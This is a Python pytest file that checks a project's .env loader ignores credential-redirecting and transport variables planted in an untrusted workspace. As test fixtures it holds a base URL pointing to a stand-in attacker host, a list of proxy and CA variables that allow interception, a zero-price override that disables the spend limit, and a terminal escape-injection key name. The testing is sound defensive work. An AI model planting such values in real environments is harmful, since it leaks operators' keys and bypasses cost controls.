# SPDX-License-Identifier: MIT
"""A discovered .env must not be able to redirect the operator's credentials."""

import os

import pytest

from sanzaru.dotenv_loader import load_local_dotenv

pytestmark = pytest.mark.unit


@pytest.fixture(autouse=True)
def _isolated_environ():
    """Snapshot/restore os.environ around every test.

    `monkeypatch.delenv(name, raising=False)` records nothing when the variable
    is already absent, so values the loader then sets with `setdefault` would
    outlive the test: a leaked `SANZARU_MEDIA_PATH` made later tests
    order-dependent and had `get_path()` mkdir a real media tree.
    """
    saved = dict(os.environ)
    for name in list(os.environ):
        if name.startswith(("OPENAI_", "SANZARU_", "DATABRICKS_", "ELEVENLABS_")):
            del os.environ[name]
    yield
    os.environ.clear()
    os.environ.update(saved)


def _write_env(directory, body: str):
    (directory / ".env").write_text(body)


def test_a_planted_base_url_is_ignored(tmp_path, caplog):
    """The exfiltration vector: one line pointing the SDK at an attacker's host.

    AsyncOpenAI reads OPENAI_BASE_URL from the environment itself, so loading it
    from a file in an untrusted workspace sent the operator's real key, as a
    bearer token, to whoever wrote the file (CWE-427).
    """
    _write_env(tmp_path, "OPENAI_API_KEY=sk-real\nOPENAI_BASE_URL=https://attacker.example/v1\n")

    with caplog.at_level("WARNING", logger="sanzaru"):
        load_local_dotenv(tmp_path)

    assert "OPENAI_BASE_URL" not in os.environ
    # The legitimate half of the documented workflow still loads.
    assert os.environ["OPENAI_API_KEY"] == "sk-real"
    assert "OPENAI_BASE_URL" in caplog.text


# Not just the application base URLs. httpx runs with trust_env=True, so the
# transport variables are a complete MITM of every provider call without naming
# a single sanzaru setting — which is why this is an allowlist and why the list
# below is worth spelling out.
@pytest.mark.parametrize(
    "key",
    [
        "OPENAI_BASE_URL",
        "OPENAI_API_BASE",
        "ELEVENLABS_BASE_URL",
        "DATABRICKS_HOST",
        "HTTPS_PROXY",
        "HTTP_PROXY",
        "ALL_PROXY",
        "SSL_CERT_FILE",
        "REQUESTS_CA_BUNDLE",
        "SANZARU_ALLOW_UNAUTHENTICATED_HTTP",
        "SANZARU_RUN_SECRET",
        "SANZARU_HTTP_TOKEN",
        "SANZARU_IDENTITY_HEADER",
        "SANZARU_REQUIRE_USER_CONTEXT",
        # Joined into the volume URL unsanitized: `..` walks into another tenant.
        "DATABRICKS_VIDEO_DIR",
        "DATABRICKS_IMAGE_DIR",
        "DATABRICKS_AUDIO_DIR",
    ],
)
def test_credential_and_transport_variables_are_ignored(tmp_path, monkeypatch, key):
    monkeypatch.delenv(key, raising=False)
    _write_env(tmp_path, f"{key}=attacker-value\n")

    load_local_dotenv(tmp_path)

    assert key not in os.environ, f"{key} must not be settable from a discovered .env"


def test_a_variable_nobody_thought_of_defaults_to_ignored(tmp_path):
    """The property an allowlist buys: unknown names fail safe."""
    _write_env(tmp_path, "SOME_FUTURE_REDIRECT_VAR=attacker\n")

    load_local_dotenv(tmp_path)

    assert "SOME_FUTURE_REDIRECT_VAR" not in os.environ


def test_a_price_override_cannot_come_from_the_file(tmp_path, caplog):
    """The price table is what `--max-cost` is enforced against.

    `SANZARU_REALTIME_PRICE_*` used to be allowlisted as a prefix on the theory
    that stale pricing is a reporting concern. It is also the spend control: a
    planted `0,0,0,0,0,0` makes every turn cost $0.00 and the ceiling never
    trips. A price override is exported, like everything else that decides
    where money goes.
    """
    key = "SANZARU_REALTIME_PRICE_GPT_REALTIME"
    _write_env(tmp_path, f"{key}=0,0,0,0,0,0\n")

    with caplog.at_level("WARNING", logger="sanzaru"):
        load_local_dotenv(tmp_path)

    assert key not in os.environ
    assert key in caplog.text  # dropped out loud, so the operator knows to export it


def test_the_documented_variables_still_load(tmp_path):
    """setup.sh writes exactly these two; the feature has to keep working."""
    media = tmp_path / "media"
    _write_env(tmp_path, f"OPENAI_API_KEY=sk-abc\nSANZARU_MEDIA_PATH={media}\n")

    load_local_dotenv(tmp_path)

    assert os.environ["OPENAI_API_KEY"] == "sk-abc"
    assert os.environ["SANZARU_MEDIA_PATH"] == str(media)


def test_a_real_exported_value_outranks_the_file(tmp_path, monkeypatch):
    _write_env(tmp_path, "OPENAI_API_KEY=sk-from-file\n")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-exported")

    load_local_dotenv(tmp_path)

    assert os.environ["OPENAI_API_KEY"] == "sk-exported"


def test_matching_is_case_sensitive(tmp_path, caplog):
    """A case-folded match would accept `openai_api_key=` and then set it under
    that spelling, which nothing on POSIX reads — a silently dead variable. As
    an unknown key it is named in the warning instead."""
    _write_env(tmp_path, "openai_api_key=sk-lower\n")

    with caplog.at_level("WARNING", logger="sanzaru"):
        load_local_dotenv(tmp_path)

    assert "openai_api_key" not in os.environ
    assert "OPENAI_API_KEY" not in os.environ
    assert "'openai_api_key'" in caplog.text


def test_ignored_key_names_are_quoted_in_the_warning(tmp_path, caplog):
    """The key names come from the attacker-authored file, and logging is the
    one stderr channel `note()`'s scrub does not cover."""
    _write_env(tmp_path, "EVIL\x1b]0;pwned\x07KEY=1\n")

    with caplog.at_level("WARNING", logger="sanzaru"):
        load_local_dotenv(tmp_path)

    assert "\x1b" not in caplog.text
    assert "\x07" not in caplog.text
    assert "'EVIL\\x1b]0;pwned\\x07KEY'" in caplog.text  # legible as what it was


def test_no_ancestor_walk(tmp_path):
    """Only ./.env is read — a file one directory up is not this run's config."""
    workspace = tmp_path / "workspace"
    project = workspace / "project"
    project.mkdir(parents=True)
    _write_env(workspace, "SANZARU_MEDIA_PATH=/planted\n")

    load_local_dotenv(project)

    assert "SANZARU_MEDIA_PATH" not in os.environ


def test_a_missing_or_unreadable_env_is_not_fatal(tmp_path):
    load_local_dotenv(tmp_path)  # no file at all
    (tmp_path / ".env").mkdir()  # a directory where a file is expected
    load_local_dotenv(tmp_path)
